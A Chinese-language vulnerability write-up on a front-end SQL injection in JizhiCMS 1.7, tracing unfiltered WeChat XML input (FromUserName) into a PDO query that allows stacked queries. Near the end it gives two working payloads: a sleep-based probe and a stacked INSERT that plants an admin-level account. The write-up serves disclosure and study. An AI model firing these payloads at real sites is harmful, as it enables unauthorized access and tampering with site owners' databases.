# 极致CMS1.7 另一处前台SQL注入

本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。

## 0x00 漏洞描述

复现了 `CNVD-2021-26000` 之后，搜索了一下极致 `cms` 相关漏洞，发现 1.7 版本的漏洞还真不少，并且还有另一个前台`SQL` 注入，并且支持堆叠查询。

## 0x01 漏洞影响

极致CMS1.7

## 0x02 漏洞分析

关于这个 `cms` 数据库方面的一些基础已经在之前发的文章中讲了一些了，数据库操作基本上没有任何防护，但是大部分的输入都是有同一套比较完善的过滤，因此我们需要找到没有过滤的输入，并且会代入数据库操作的地方

这里有一处 `Home/c/WechatController.php` 的 `responseMsg` 方法

```php
$postStr = file_get_contents('php://input');
if (!empty($postStr)){
    libxml_disable_entity_loader(true);
    $postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);
    $this->postObj = $postObj;
    $fromUsername = $postObj->FromUserName;
    $toUsername = $postObj->ToUserName;
    $keyword = trim($postObj->Content);
    $time = time();
    $textTpl = "<xml>
                    <ToUserName><![CDATA[%s]]></ToUserName>
                    <FromUserName><![CDATA[%s]]></FromUserName>
                    <CreateTime>%s</CreateTime>
                    <MsgType><![CDATA[%s]]></MsgType>
                    <Content><![CDATA[%s]]></Content>
                    <FuncFlag>0</FuncFlag>
                    </xml>";
    if($postObj->MsgType=='event'){
        switch ($postObj->Event){
            case 'CLICK':
            break;
            case 'subscribe':
            $openid = $fromUsername;
            $islive = M('member')->find(array('openid'=>$openid));
```

首先是

```php
$postStr = file_get_contents('php://input');
```

这里是直接获取数据流，赋值给 `$postStr` ，因此这里就没有其他过滤

然后使用函数解析 `simplexml_load_string` ，可以用来解析 `xml` 字符串，要不是上面那一句，这里就有 `xxe` 漏洞咯

接下来是一串赋值，最后进入一个 `if` 语句，只有满足 `$postObj->MsgType=='event'` ，才会继续向下执行，而这个值是我们可控的，不成问题，设置

```xml
<MsgType><![CDATA[event]]></MsgType>
```

然后是 `switch` 语句，比较简单，选择使得 `$postObj->Event ==  'subscribe'`

```xml
<Event><![CDATA[subscribe]]></Event>
```

然后会执行

```php
$openid = $fromUsername;
$islive = M('member')->find(array('openid'=>$openid));
```

这里会先赋值，然后进入数据库操作，而这个 `$fromUsername` 在上面有定义

```php
$fromUsername = $postObj->FromUserName;
```

这也是可控的，可以这样

```xml
<FromUserName><![CDATA[1]]></FromUserName>
```

最后进入到了 `FrPHP/lib/Model.php` 的 `find` 方法

```php
public function find($where=null,$order=null,$fields=null,$limit=1)
{
   if( $record = $this->findAll($where, $order, $fields, 1) ){
        return array_pop($record);
    }else{
        return FALSE;
    }
}
```

这实际上是调用 `$this->findAll` ，只是限制了查询数量为 1，我们看 `$this->findAll`

```php
public function findAll($conditions=null,$order=null,$fields=null,$limit=null)
{
    $where = '';
    if(is_array($conditions)){
        $join = array();
        foreach( $conditions as $key => $value ){
            $value =  '\''.$value.'\'';
            $join[] = "{$key} = {$value}";
        }
        $where = "WHERE ".join(" AND ",$join);
    }else{
        if(null != $conditions)$where = "WHERE ".$conditions;
    }
  if(is_array($order)){
        $where .= ' ORDER BY ';
        $where .= implode(',', $order);
  }else{
     if($order!=null)$where .= " ORDER BY  ".$order;
  }
    if(!empty($limit))$where .= " LIMIT {$limit}";
    $fields = empty($fields) ? "*" : $fields;
    $table = self::$table;
    $sql = "SELECT {$fields} FROM {$table} {$where}";
    return $this->db->getArray($sql);
}
```

这里的 `$conditions` 就是传进来的 `array('openid'=>$openid)` ，到最后会拼接字符串形成最后的 `sql` 语句

```sql
SELECT * FROM jz_member WHERE openid = '1' LIMIT 1
```

这里的 1 就是传进来的值，这个值没有经过任何过滤，因此我们可以随意拼接，最后传入 `$this->db->getArray($sql)`

```php
public function getArray($sql){
    if(!$result = $this->query($sql))return array();
    if(!$this->Statement->rowCount())return array();
    $rows = array();
    while($rows[] = $this->Statement->fetch(PDO::FETCH_ASSOC)){}
    $this->Statement=null;
    array_pop($rows);
    return $rows;
}
```

然后就会执行 `$this->query($sql)`

```php
public function query($sql){
    $this->arrSql[] = $sql;
    $this->Statement = $this->pdo->query($sql);
    if ($this->Statement) {
        return $this;
    }else{
        $msg = $this->pdo->errorInfo();
        if($msg[2]){
            Error_msg('数据库错误：' . $msg[2] . end($this->arrSql));
        }
    }
}
```

这里使用了一个 `pdo` 对象（ `pdo` 数据对象扩展是 `php` 访问数据库的一个轻量级接口，`PDO` 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。），可以使用堆叠查询

执行后返回结果集，之后处理就不管了，至少执行 `sql` 之前没有任何处理，妥妥的 `sql` 注入，而且可以堆叠查询

## 0x03 漏洞复现

![](https://gitee.com/N0puple/nopic/raw/master/img/20210707234408.png)

放两个 `payload`

```
1';select sleep(5)-- 
```

```
1';insert into jz_level values(999,'fff','a877cec7a6ffd70dfd313411d6196a40','1','1','1','1','1','1')#
```

## 0x04 链接

环境与 `poc` 都可以在如下链接获取

### GitHub

https://github.com/N0puple/vulPOC

